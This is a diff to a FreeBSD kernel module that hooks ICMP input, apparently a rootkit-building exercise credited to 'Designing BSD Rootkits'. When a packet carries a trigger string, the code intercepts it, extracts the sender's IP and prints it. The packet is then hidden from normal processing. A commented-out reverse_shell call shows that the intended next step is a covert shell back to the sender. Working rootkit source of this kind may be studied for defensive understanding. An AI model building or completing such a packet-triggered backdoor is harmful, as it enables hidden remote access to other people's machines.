@@ -5,6 +5,11 @@
 #include <sys/systm.h>
 #include <sys/mbuf.h>
 #include <sys/protosw.h>
+#include <sys/socket.h>
+
+//#include <stdlib.h>
+#include <arpa/inet.h>
+#include <unistd.h>
 
 #include <netinet/in.h>
 #include <netinet/in_systm.h>
@@ -30,8 +35,17 @@ int icmp_input_hook(struct mbuf **m, int *off, int proto) {
     (*m)->m_len += hlen;
     (*m)->m_data -= hlen;
 
+    // Check payload to see if it matches trigger
     if (strncmp(icp->icmp_data, TRIGGER, strlen(TRIGGER)) == 0) {
-        printf("gumper?\n");
+        
+        // Borrowed from chatgpt
+        struct ip *iph = (struct ip*)(*m)->m_data;
+        struct in_addr src_ip = iph->ip_src;
+        char src_ip_str[INET_ADDRSTRLEN];
+        inet_ntop(AF_INET, &src_ip, src_ip_str, INET_ADDRSTRLEN);
+
+        printf("gumper came from: %s\n", src_ip_str);
+        //reverse_shell(src_ip_str);
     }
     else {
         return icmp_input(m, off, proto);
@@ -72,4 +86,4 @@ static moduledata_t icmp_input_hook_mod = {
 
 DECLARE_MODULE(icmp_input_hook, icmp_input_hook_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
 
-// Credit to "Designing BSD Rootkits" by Joseph Kong
+// Credit to "Designing BSD Rootkits" by Joseph Kong and ChatGPT
